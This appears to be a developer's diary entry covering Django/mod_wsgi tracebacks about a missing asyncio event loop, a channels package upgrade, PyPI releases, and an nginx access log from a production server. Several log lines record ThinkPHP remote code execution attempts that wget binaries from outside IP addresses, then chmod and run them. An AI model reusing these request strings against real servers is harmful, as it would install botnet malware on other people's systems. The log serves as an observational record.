@@ -1,0 +1,95 @@
+:date: 2019-11-11
+
+=========================
+Monday, November 11, 2019
+=========================
+
+We are still having errors like this one::
+
+  mod_wsgi (pid=23481): Failed to exec Python script file '/usr/local/python/lino_sites/hobbit/apache/wsgi.py'.
+  mod_wsgi (pid=23481): Exception occurred processing WSGI script '/usr/local/python/lino_sites/hobbit/apache/wsgi.py'.
+  Traceback (most recent call last):
+    File "/usr/local/python/lino_sites/hobbit/apache/wsgi.py", line 13, in <module>
+      from lino_local import setup_wsgi ; setup_wsgi(globals())
+    File "/usr/local/python/lino_local.py", line 21, in setup_wsgi
+      globals_dict.update(application = get_wsgi_application())
+    File "/mnt/disk/jane/env3/lib/python3.7/site-packages/django/core/wsgi.py", line 12, in get_wsgi_application
+      django.setup(set_prefix=False)
+    File "/mnt/disk/jane/env3/lib/python3.7/site-packages/django/__init__.py", line 24, in setup
+      apps.populate(settings.INSTALLED_APPS)
+    File "/mnt/disk/jane/env3/lib/python3.7/site-packages/django/apps/registry.py", line 91, in populate
+      app_config = AppConfig.create(entry)
+    File "/mnt/disk/jane/env3/lib/python3.7/site-packages/django/apps/config.py", line 116, in create
+      mod = import_module(mod_path)
+    File "/usr/lib/python3.7/importlib/__init__.py", line 127, in import_module
+      return _bootstrap._gcd_import(name[level:], package, level)
+    File "<frozen importlib._bootstrap>", line 1006, in _gcd_import
+    File "<frozen importlib._bootstrap>", line 983, in _find_and_load
+    File "<frozen importlib._bootstrap>", line 967, in _find_and_load_unlocked
+    File "<frozen importlib._bootstrap>", line 677, in _load_unlocked
+    File "<frozen importlib._bootstrap_external>", line 728, in exec_module
+    File "<frozen importlib._bootstrap>", line 219, in _call_with_frames_removed
+    File "/mnt/disk/jane/env3/lib/python3.7/site-packages/channels/apps.py", line 6, in <module>
+      import daphne.server
+    File "/mnt/disk/jane/env3/lib/python3.7/site-packages/daphne/server.py", line 18, in <module>
+      asyncioreactor.install()
+    File "/mnt/disk/jane/env3/lib/python3.7/site-packages/twisted/internet/asyncioreactor.py", line 320, in install
+      reactor = AsyncioSelectorReactor(eventloop)
+    File "/mnt/disk/jane/env3/lib/python3.7/site-packages/twisted/internet/asyncioreactor.py", line 62, in __init__
+      eventloop = get_event_loop()
+    File "/usr/lib/python3.7/asyncio/events.py", line 644, in get_event_loop
+      % threading.current_thread().name)
+  RuntimeError: There is no current event loop in thread 'Dummy-1'.
+  mod_wsgi (pid=23481): Failed to exec Python script file '/usr/local/python/lino_sites/hobbit/apache/wsgi.py'.
+  mod_wsgi (pid=23481): Exception occurred processing WSGI script '/usr/local/python/lino_sites/hobbit/apache/wsgi.py'.
+  Traceback (most recent call last):
+    File "/usr/local/python/lino_sites/hobbit/apache/wsgi.py", line 13, in <module>
+      from lino_local import setup_wsgi ; setup_wsgi(globals())
+    File "/usr/local/python/lino_local.py", line 21, in setup_wsgi
+      globals_dict.update(application = get_wsgi_application())
+    File "/mnt/disk/jane/env3/lib/python3.7/site-packages/django/core/wsgi.py", line 12, in get_wsgi_application
+      django.setup(set_prefix=False)
+    File "/mnt/disk/jane/env3/lib/python3.7/site-packages/django/__init__.py", line 24, in setup
+      apps.populate(settings.INSTALLED_APPS)
+    File "/mnt/disk/jane/env3/lib/python3.7/site-packages/django/apps/registry.py", line 83, in populate
+      raise RuntimeError("populate() isn't reentrant")
+  RuntimeError: populate() isn't reentrant
+
+
+::
+
+  $ pip install -U channels
+  ...
+  Installing collected packages: asgiref, daphne, channels
+    Found existing installation: asgiref 2.3.2
+      Uninstalling asgiref-2.3.2:
+        Successfully uninstalled asgiref-2.3.2
+    Found existing installation: daphne 2.2.4
+      Uninstalling daphne-2.2.4:
+        Successfully uninstalled daphne-2.2.4
+    Found existing installation: channels 2.1.6
+      Uninstalling channels-2.1.6:
+        Successfully uninstalled channels-2.1.6
+  Successfully installed asgiref-3.2.3 channels-2.3.1 daphne-2.3.0
+
+
+
+Releases to PyPI: lino, xl, avanti
+
+
+Excerpt from nginx access log of a public production server::
+
+  177.66.145.245 - - [11/Nov/2019:18:07:13 +0100] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://194.182.85.62/bins/Tsunami.x86 -O thpnkphp ; chmod 777 thpnkphp ; ./thpnkphp ThinkPHP ; rm -rf thinkphp' HTTP/1.1" 400 173 "-" "Tsunami/2.0"
+  69.249.245.65 - - [11/Nov/2019:18:14:00 +0100] "GET / HTTP/1.1" 200 612 "-" "-"
+  149.200.181.46 - - [11/Nov/2019:18:24:48 +0100] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://157.245.182.3/sunless/sunless.x86 -O /tmp/.sunless; chmod 777 /tmp/.sunless; /tmp/.sunless thinkphp' HTTP/1.1" 400 173 "-" "thinkphp/2.0"
+  86.108.110.123 - - [11/Nov/2019:18:46:23 +0100] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://157.245.182.3/sunless/sunless.x86 -O /tmp/.sunless; chmod 777 /tmp/.sunless; /tmp/.sunless thinkphp' HTTP/1.1" 400 173 "-" "thinkphp/2.0"
+  45.95.168.115 - - [11/Nov/2019:18:51:07 +0100] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://185.172.110.232/bins/x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp' HTTP/1.1" 400 173 "-" "Uirusu/2.0"
+  77.247.109.38 - - [11/Nov/2019:18:55:57 +0100] "HEAD /robots.txt HTTP/1.0" 404 0 "-" "-"
+  174.138.3.29 - - [11/Nov/2019:19:06:03 +0100] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://82.118.242.108/bins/x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp' HTTP/1.1" 400 173 "-" "Uirusu/2.0"
+  94.249.55.115 - - [11/Nov/2019:19:31:55 +0100] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://157.245.182.3/sunless/sunless.x86 -O /tmp/.sunless; chmod 777 /tmp/.sunless; /tmp/.sunless thinkphp' HTTP/1.1" 400 173 "-" "thinkphp/2.0"
+  104.248.164.231 - - [11/Nov/2019:20:04:12 +0100] "GET / HTTP/1.0" 200 612 "-" "masscan/1.0 (https://github.com/robertdavidgraham/masscan)"
+  78.128.112.14 - - [11/Nov/2019:20:18:12 +0100] "\x03\x00\x00+&\xE0\x00\x00\x00\x00\x00Cookie: mstshash=hello" 400 173 "-" "-"
+  120.79.50.93 - - [11/Nov/2019:20:22:13 +0100] "GET /webdav/ HTTP/1.1" 404 169 "-" "Mozilla/5.0"
+  110.139.28.38 - - [11/Nov/2019:20:32:06 +0100] "GET / HTTP/1.1" 200 612 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
+  50.207.163.12 - - [11/Nov/2019:20:37:45 +0100] "GET /index.php?s=/index/\x5Cthink\x5Capp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget%20http://142.44.251.105/x86%20-O%20loli;%20chmod%20777%20loli;%20loli thinkphp' HTTP/1.1" 400 173 "-" "Liquor/1.0"
+  37.202.91.219 - - [11/Nov/2019:21:00:33 +0100] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://157.245.182.3/sunless/sunless.x86 -O /tmp/.sunless; chmod 777 /tmp/.sunless; /tmp/.sunless thinkphp' HTTP/1.1" 400 173 "-" "thinkphp/2.0"
